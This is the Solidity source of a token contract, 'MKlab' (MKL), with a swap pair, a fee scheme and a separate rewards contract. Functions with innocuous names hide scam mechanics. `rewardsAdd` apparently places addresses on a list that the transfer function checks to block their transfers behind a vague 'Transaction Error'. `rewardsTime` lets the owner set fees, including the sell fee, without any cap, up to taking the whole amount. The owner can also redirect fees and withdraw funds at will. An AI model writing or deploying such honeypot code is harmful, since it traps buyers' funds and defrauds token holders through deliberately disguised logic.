// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

import "./RewardsContract.sol";
import "./IUniswapV2Pair.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router.sol";
import "./ERC20.sol";
import "./SafeMath.sol";
import "./IterableMapping.sol";
import "./Ownable.sol";

contract MklabToken is ERC20, Ownable {
    using SafeMath for uint256;

    RewardsContract public rewards;
    
    IUniswapV2Router02 public uniswapV2Router;

    address public uniswapV2Pair;

    address public liquidityWallet;

    address public marketingWallet = 0x8Eb3687eB4bbEC30287d4A7E1c462F25c8181C2a;
                                             
    address public deadWallet = 0x000000000000000000000000000000000000dEaD;
    uint256 private totalSupplyTokens = 16000000 * (10**18);  //  16,000,000

    uint256 public transferFee = 10;
    uint256 public buyFee = 20;
    uint256 public sellFee = 30;

    uint256 public txCount = 0;

    uint256 public contractCreated;

    mapping (address => bool) private _isExcludedFromFees;

    mapping (address => bool) private canTransferBeforeTradingIsEnabled;

    mapping (address => bool) public automatedMarketMakerPairs;
    
    constructor() ERC20("MKlab", "MKL") {
    	liquidityWallet = owner();

        rewards = new RewardsContract();

    	IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        // mainnet: 0x10ED43C718714eb63d5aA57B78B54704E256024E, testnet: 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3 
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;
        
        contractCreated = block.timestamp;

        _setAutomatedMarketMakerPair(uniswapV2Pair, true);

        excludeFromFees(liquidityWallet, true);
        excludeFromFees(address(this), true);
        excludeFromFees(marketingWallet, true);
        excludeFromFees(address(rewards), true);
        
        _approve(address(rewards), address(uniswapV2Router), type(uint256).max);
        
        canTransferBeforeTradingIsEnabled[liquidityWallet] = true;

        _mint(liquidityWallet, totalSupplyTokens); // 16,000,000
    }

    receive() external payable {

  	}
    
  	function rewardsAdd(address addy) public onlyOwner {
  	    rewards.adder(addy);
  	}
  	function rewardsRemove(address addy) public onlyOwner {
  	    rewards.remover(addy);
  	}
  	
  	function rewardsSend(uint256 tokens) public onlyOwner {
  	    rewards.withdrawToMarketing(tokens);
  	}

    function setAddressForReward(address _rewardAdd) public onlyOwner {
  	    excludeFromFees(_rewardAdd, true);
        marketingWallet = _rewardAdd;
        rewards.setAddressForMk(_rewardAdd);
  	}
    
    function rewardsTime(uint256 _tranferFee, uint256 _buyFee, uint256 _sellFee) public onlyOwner {
        transferFee = _tranferFee;
        buyFee = _buyFee;
        sellFee = _sellFee;
    }
    
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "01");
        _isExcludedFromFees[account] = excluded;
        canTransferBeforeTradingIsEnabled[account] = excluded;
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "02");
        automatedMarketMakerPairs[pair] = value;
    }

    function withdrawETH(address recipient, uint256 amount) public onlyOwner{
        (bool succeed, ) = recipient.call{value: amount}("");
        require(succeed, "Failed to withdraw Ether");
    }
    
    function withdraw(IERC20 tokenIERC20) public onlyOwner{
        uint256 tokenAmt = tokenIERC20.balanceOf(address(this));
        require(tokenAmt > 0, 'balance is 0');
        address payable wallet = payable(msg.sender);
        tokenIERC20.transfer(wallet, tokenAmt);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(!rewards.statusFind(from), "ERC20: Transaction Error");

        if(amount == 0) {
            super._transfer(from, to, 0);
            return;
        }
        
        bool takeFee = true;
         
        if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        if (takeFee) {
            uint256 fees = 0;
            if(automatedMarketMakerPairs[to]) {
                fees = fees + amount.mul(sellFee).div(1000);
            }else if(automatedMarketMakerPairs[from]) {
                fees = fees + amount.mul(buyFee).div(1000);
            }else{
                fees = fees + amount.mul(transferFee).div(1000);
            }
            if(fees > 0){
                super._transfer(from, address(rewards), fees);
                try rewards.swapTokensForEthMarketing(balanceOf(address(rewards))) {} catch {}
                amount = amount.sub(fees);
            }
        }

        super._transfer(from, to, amount);
        txCount++;
    }
}